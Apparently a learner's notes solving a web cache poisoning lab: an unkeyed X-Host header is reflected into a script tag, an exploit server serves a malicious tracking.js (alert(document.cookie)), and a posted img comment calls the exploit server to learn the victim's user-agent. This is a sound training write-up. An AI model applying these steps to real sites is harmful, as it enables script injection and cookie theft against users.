1) we noticed that the header X-Host is reflected into the response (using the script we wrote)  (https://0ab7002d041e94cd819f2f9400dc00ca.h1-web-security-academy.net/post?postId=4)
2) we can see that if we use a random value in the get URL like ?test=1 and X-Host then the website stores in the cache the page and the URL is used as key
    differently X-Host is not used as key
3) if we do now the same request to domain?test=1 without X-Forwarded-Host we can notice that the previous X-Host is reflected, because is cached. We can exploit this vulnerability.

4) the X-Host is reflected in :
<script type="text/javascript" src="//REFLECTED/resources/js/tracking.js"></script>

5) we can go on our exploit server and create a resource at /resources/js/tracking.js
6) in the header of the exploit server response we put Content-Type: application/javascript; charset=utf-8
7) in the body alert(document.cookie) (it is aolready a js file so we don't need <script> </script>) 

8) we force to save in cache the <script type="text/javascript" src="//EXPLOIT-SERVER/resources/js/tracking.js"></script> performing a request to the domain with X-Host: EXPLOIT-SERVER
    we can see that the js is stored in caxche and the alert is triggered


9) we need to understand the victim user-agent because it is keyed, so we want to target him. This means that we want to understand the victim user-agent and use it in our malicious request

10) the website post publishing allows html, so we can force the victim to perform a request to our malicious website. So we cna publish this comment:
    <img src="https://YOUR-EXPLOIT-SERVER-ID.exploit-server.net/get_user_agent" />

In this case is Mozilla/5.0 (Victim) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36

11) send a request to https://0ab7002d041e94cd819f2f9400dc00ca.h1-web-security-academy.net/post?postId=4 with headers:
    X-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net

